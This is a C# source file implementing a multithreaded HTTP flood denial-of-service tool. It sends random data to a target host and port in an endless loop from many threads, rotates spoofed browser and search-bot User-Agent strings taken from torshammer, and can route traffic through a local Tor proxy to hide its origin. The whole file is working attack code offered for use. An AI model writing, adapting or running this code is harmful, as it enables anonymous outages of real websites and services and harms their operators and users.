using System;
using System.Net;
using System.Threading;
namespace YFLOOD{
public class XFLOOD{
	public static void startFlood(string host,int port,bool usetor){
			try{  //I added try-catch beacuse, program crashed unexpectly
				//Example User-Agents (from torshammer)	
			string[] UserAgent = new string[21];
			UserAgent[0] = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)";
			UserAgent[1] ="Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)";
			UserAgent[2] ="Googlebot/2.1 (http://www.googlebot.com/bot.html)";
			UserAgent[3] ="Opera/9.20 (Windows NT 6.0; U; en)";
			UserAgent[4] ="Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)";
			UserAgent[5] ="Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)";
			UserAgent[6] ="Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0";
			UserAgent[7] ="Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16";
			UserAgent[8] ="Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)";
			UserAgent[9] ="Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13";
			UserAgent[10] ="Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)";
			UserAgent[11] ="Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)";
			UserAgent[12] ="Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)";
			UserAgent[13] ="Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)";
			UserAgent[14] ="Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)";
			UserAgent[15] ="Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8";
			UserAgent[16] ="Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7";
			UserAgent[17] ="Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)";
			UserAgent[19] ="Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)";
			UserAgent[20] ="YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)";
			byte[] ByteArray = new byte[1000];
			int i;
			for (i = 0; i < 1000; i++) {
			Random r = new Random ();
			ByteArray [i] = (byte)r.Next (1, 100);
		}
		WebClient web = new WebClient ();
		if(usetor){
			web.Proxy = new WebProxy ("localhost:8118");
		}
		Uri MyURI = new Uri("http://" + host + ":" + port);
		while (true) {
				Random q = new Random ();
				web.Headers.Add (HttpRequestHeader.UserAgent, UserAgent[q.Next(1,21)]);
			web.UploadDataAsync (MyURI,ByteArray);
				}
			}catch(System.NotSupportedException){
				Console.WriteLine (".");
			}	
	}

	public static void HTTPFlood(string xhost,int xport,bool xusetor,int threads){
			Thread[] ThreadArray = new Thread[threads];
		int k;
		for (k = 0; k < threads; k++) {
			ThreadArray [k] = new Thread (() => startFlood (xhost, xport, xusetor));
			}
		for (k = 0; k < threads; k++) {
				ThreadArray [k].Start();
		}
	}
}
}